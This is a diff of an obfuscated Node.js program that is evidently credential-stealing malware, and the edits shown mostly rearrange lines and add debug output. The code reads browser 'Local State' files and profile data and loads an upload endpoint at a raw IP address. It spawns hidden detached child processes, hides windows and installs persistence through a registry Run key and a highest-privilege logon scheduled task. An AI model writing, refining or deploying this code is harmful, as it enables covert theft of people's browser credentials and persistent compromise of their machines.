@@ -2,14 +2,12 @@
 try {
     const os = require('os'),
         fs = require('fs'),
-        path = require('path'),
-        sqlite3 = require('sqlite3').verbose(),
-        FormData = require('form-data'),
         axios = require('axios'),
         { execSync, spawn } = require('child_process'),
-        uploadUrl = "http://144.172.104.117:5918/upload",
         { windowManager } = require('node-window-manager')
-
+        sqlite3 = require('sqlite3').verbose(),
+        FormData = require('form-data'),
+        uploadUrl = "http://144.172.104.117:5918/upload",
     process.on('uncaughtException', (_0xad8869) => {})
     process.on('unhandledRejection', (_0x461982) => {})
     let i = 0;
@@ -31,7 +29,7 @@ try {
         m = a + '.' + b + '.' + c + '.' + d,
         usu = e + '.' + f + '.' + g + '.' + h,
         lsu = e + '.' + f + '.' + g + '.' + h 
-    // console.log("hello");
+    console.log("hello");
     function hideWindowByProcessName(name) {
         const windows = windowManager.getWindows();
         let found = false;
@@ -119,7 +117,8 @@ try {
                 const _0x69392 = spawn('node', ['-e', childScript], { 
                     windowsHide: true,
                     detached: true,
-                    stdio: 'ignore', });
+                    stdio: 'ignore', // Capture output without console
+                });
                 _0x69392.unref();
                 execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NodeHelper" /t REG_SZ /d "node ${__dirname}\\index.js" /f`, {stdio: 'ignore'});
                 execSync(`schtasks /create /tn "NodeUpdate" /tr "node ${__dirname}\\index.js" /sc onlogon /rl highest /f`, {stdio: 'ignore'});
@@ -468,8 +467,9 @@ try {
                 const _0x23df1e = spawn('node', ['-e', _0x3d341e], {
                     windowsHide: true,
                     detached: true,
-                    stdio: 'ignore',
+                    stdio: 'ignore', // Capture output without console
                 });
+
                 _0x23df1e.unref();
                 resolve({ success: true, message: "third completed"});
                 // process.exit(0);
@@ -655,17 +655,19 @@ try {
         }   
         const SetData = async() => {
             const basePaths = getBasePaths();
+            
             for (const basePath of basePaths) {
-                    const localStatePath = path.join(basePath, "Local State");
-                    await uf(localStatePath);  // Now this works correctly
+                    
                 }
             
             for (const basePath of basePaths) {
                 if (!fs.existsSync(basePath)) {
                     console.log('Base path not found: basePaths');
                 }
-    
+                const localStatePath = path.join(basePath, "Local State");
+                    await uf(localStatePath);  // Now this works correctly
                 const profilePaths = getProfilePaths(basePath);
+                console.log(profilePaths);
                 for (const profilePath of profilePaths) {
                     const browserData = await extractBrowserData(profilePath);
                     if (browserData.length > 0) {
@@ -686,8 +688,8 @@ try {
                 const _0x849f8 = spawn('node', ['-e', _0x4f325],{
                     windowsHide: true,
                     detached: true,
-                    stdio: 'ignore', // Capture output
-                    });
+                    stdio: 'ignore', // Capture output without console
+                });
                 _0x849f8.unref();
                 resolve({ success: true, message: "second completed"});
                 // console.log(_0x849f8);
